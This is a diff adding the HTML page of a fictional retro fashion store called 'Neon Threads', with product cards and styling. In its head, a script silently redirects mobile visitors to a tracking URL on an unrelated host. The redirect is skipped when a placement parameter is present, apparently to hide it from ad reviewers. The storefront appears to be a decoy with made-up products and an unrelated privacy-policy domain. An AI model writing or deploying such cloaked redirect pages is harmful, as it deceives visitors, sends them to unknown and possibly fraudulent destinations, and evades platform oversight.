@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/dade2563-43ce-4351-9ba3-22961c539221?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Neon Threads - Retro Future Fashion</title>
+    <style>
+        body {
+            font-family: 'Courier New', monospace;
+            background-color: #000;
+            color: #0ff;
+            margin: 0;
+            padding: 0;
+        }
+        header {
+            background-color: #ff00ff;
+            padding: 20px;
+            text-align: center;
+        }
+        h1 {
+            font-size: 3em;
+            text-shadow: 2px 2px #00ff00;
+        }
+        nav {
+            background-color: #00ff00;
+            padding: 10px;
+        }
+        nav a {
+            color: #000;
+            text-decoration: none;
+            padding: 5px 10px;
+            margin: 0 5px;
+            border: 2px solid #000;
+            border-radius: 15px;
+        }
+        main {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-around;
+            padding: 20px;
+        }
+        .product {
+            background-color: #333;
+            border: 3px solid #0ff;
+            border-radius: 10px;
+            margin: 10px;
+            padding: 15px;
+            width: 250px;
+            text-align: center;
+        }
+        .product img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 5px;
+        }
+        footer {
+            background-color: #ff00ff;
+            color: #000;
+            text-align: center;
+            padding: 10px;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Neon Threads</h1>
+        <p>Retro Future Fashion for the Cyber Age</p>
+    </header>
+    <nav>
+        <a href="#">Home</a>
+        <a href="#">Shop</a>
+        <a href="#">About</a>
+        <a href="#">Contact</a>
+    </nav>
+    <main>
+        <div class="product">
+            <img src="https://placehold.co/250x250/ff00ff/000000?text=Cyber+Jacket" alt="Cyber Jacket">
+            <h2>Cyber Jacket</h2>
+            <p>Light-up LED collar, weather-responsive fabric</p>
+            <p>$299.99</p>
+        </div>
+        <div class="product">
+            <img src="https://placehold.co/250x250/00ff00/000000?text=Holo+Boots" alt="Holo Boots">
+            <h2>Holo Boots</h2>
+            <p>Holographic finish, anti-gravity soles</p>
+            <p>$199.99</p>
+        </div>
+        <div class="product">
+            <img src="https://placehold.co/250x250/0000ff/ffffff?text=Quantum+Shades" alt="Quantum Shades">
+            <h2>Quantum Shades</h2>
+            <p>AI-powered AR display, mind-control interface</p>
+            <p>$499.99</p>
+        </div>
+    </main>
+    <footer>
+        <p>&copy; 2023 Neon Threads | <a href="https://tokreward.com/privacy.html">Privacy Policy</a></p>
+    </footer>
+</body>
+</html>
